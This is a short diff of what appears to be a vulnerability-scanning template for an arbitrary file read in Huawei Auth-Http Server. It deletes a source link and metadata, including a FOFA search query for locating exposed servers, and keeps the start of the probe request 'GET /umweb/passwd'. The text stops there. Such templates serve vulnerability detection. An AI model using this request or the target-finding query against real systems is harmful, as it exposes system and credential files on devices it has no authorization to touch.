@@ -3,12 +3,8 @@ info:
   name: 华为Auth-Http服务任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fui35sku6wfg5dgx'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fui35sku6wfg5dgx
-    fofa: server="Huawei Auth-Http Server 1.0"
 http:
 - raw:
   - 'GET /umweb/passwd HTTP/1.1
